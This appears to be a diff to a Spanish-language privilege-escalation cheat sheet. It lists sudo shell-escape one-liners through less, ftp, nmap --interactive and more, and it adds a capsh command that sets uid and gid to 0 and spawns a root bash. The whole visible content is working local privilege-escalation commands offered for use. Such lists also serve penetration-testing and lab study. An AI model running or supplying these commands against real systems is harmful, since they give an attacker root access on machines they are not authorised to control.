@@ -20,6 +20,7 @@ sudo less /etc/profile --> !/bin/sh
 sudo ftp --> !sh
 sudo nmap --interactive --> !sh
 TERM=sudo more /etc/profile --> !sh
+/usr/bin/capsh --uid=0 --gid=0 -- -c '/bin/bash'
 
 # script para escalar privilegios en bash
 !/bin/bash
